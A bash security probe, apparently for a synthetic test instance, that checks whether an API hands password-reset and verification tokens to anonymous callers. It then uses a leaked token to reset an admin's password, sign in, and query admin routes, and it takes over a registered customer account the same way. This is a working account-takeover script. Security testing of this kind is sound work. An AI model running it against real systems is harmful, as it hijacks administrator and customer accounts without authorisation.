#!/usr/bin/env bash
# Probe: can an anonymous caller obtain a password-reset token and become a back-office user? Synthetic instance only.
set -u
j() { node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{const o=JSON.parse(s);const k=process.argv[1];const v=k.split(".").reduce((a,p)=>a==null?a:a[p],o);process.stdout.write(v==null?"":String(v))}catch{process.stdout.write("")}})' "$1"; }
EMAIL="${PROBE_EMAIL:-admin@buzzard.de}"
r=$(curl -s -m 10 -X POST "$API_URL/api/identity-security/auth/password-reset-request" -H 'Content-Type: application/json' -d "{\"email\":\"$EMAIL\"}")
tok=$(printf '%s' "$r" | j resetTokenForDevelopment)
echo "identity reset-request: token returned to anonymous caller: $([[ -n "$tok" ]] && echo YES || echo no) (keys: $(printf '%s' "$r" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(Object.keys(JSON.parse(s)).join(","))}catch{console.log("?")}})'))"
if [[ -n "$tok" ]]; then
  NEW="Probe-$(node -e 'process.stdout.write(require("crypto").randomBytes(9).toString("base64url"))')-9z"
  c=$(curl -s -m 10 -o /dev/null -w '%{http_code}' -X POST "$API_URL/api/identity-security/auth/password-reset" -H 'Content-Type: application/json' -d "{\"token\":\"$tok\",\"password\":\"$NEW\"}")
  echo "identity reset with that token: HTTP $c"
  l=$(curl -s -m 10 -X POST "$API_URL/api/auth/login" -H 'Content-Type: application/json' -d "{\"email\":\"$EMAIL\",\"password\":\"$NEW\"}")
  jwt=$(printf '%s' "$l" | j token)
  role=$(printf '%s' "$l" | j user.role)
  echo "sign-in (/api/auth/login) with the new password: token issued: $([[ -n "$jwt" ]] && echo YES || echo no), role: ${role:-?} $(printf '%s' "$l" | j error)"
  if [[ -z "$jwt" ]]; then
    l=$(curl -s -m 10 -X POST "$API_URL/api/identity-security/auth/login" -H 'Content-Type: application/json' -d "{\"email\":\"$EMAIL\",\"password\":\"$NEW\"}")
    jwt=$(printf '%s' "$l" | j accessToken)
    role=$(printf '%s' "$l" | j user.role)
    echo "sign-in (/api/identity-security/auth/login): token issued: $([[ -n "$jwt" ]] && echo YES || echo no), role: ${role:-?} $(printf '%s' "$l" | j error) keys=$(printf '%s' "$l" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(Object.keys(JSON.parse(s)).join(","))}catch{console.log("?")}})')"
  fi
  if [[ -n "$jwt" ]]; then
    for route in /api/admin/users /api/admin/security/events /api/admin/orders; do
      echo "  GET $route as that user: HTTP $(curl -s -m 10 -o /dev/null -w '%{http_code}' "$API_URL$route" -H "Authorization: Bearer $jwt")"
    done
  fi
fi
# customer account store
reg=$(curl -s -m 10 -X POST "$API_URL/api/account/register" -H 'Content-Type: application/json' -d '{"email":"victim@synthetic.invalid","password":"Victim-Pass-123456","passwordConfirm":"Victim-Pass-123456","firstName":"Syn","lastName":"Thetic","acceptTerms":true,"acceptPrivacy":true}')
echo "customer register: $(printf '%s' "$reg" | j success)$(printf '%s' "$reg" | j errorKey)"
r2=$(curl -s -m 10 -X POST "$API_URL/api/account/password-reset/request" -H 'Content-Type: application/json' -d '{"email":"victim@synthetic.invalid"}')
t2=$(printf '%s' "$r2" | j resetToken)
r3=$(curl -s -m 10 -X POST "$API_URL/api/account/password-reset/request" -H 'Content-Type: application/json' -d '{"email":"nobody@synthetic.invalid"}')
echo "customer reset-request: token returned to anonymous caller: $([[ -n "$t2" ]] && echo YES || echo no); answer for unknown address identical: $([[ "$(printf '%s' "$r2" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const o=JSON.parse(s);delete o.resetToken;console.log(JSON.stringify(o))})')" == "$r3" && -z "$t2" ]] && echo yes || echo NO)"
if [[ -n "$t2" ]]; then
  c=$(curl -s -m 10 -o /dev/null -w '%{http_code}' -X POST "$API_URL/api/account/password-reset/confirm" -H 'Content-Type: application/json' -d "{\"token\":\"$t2\",\"password\":\"Taken-Over-123456\",\"passwordConfirm\":\"Taken-Over-123456\"}")
  echo "customer reset confirm with that token: HTTP $c"
fi
v=$(curl -s -m 10 -X POST "$API_URL/api/identity-security/auth/register" -H 'Content-Type: application/json' -d '{"email":"other@synthetic.invalid","password":"Other-Pass-1234567"}')
echo "identity register: verification token returned: $([[ -n "$(printf '%s' "$v" | j verificationTokenForDevelopment)" ]] && echo YES || echo no)"
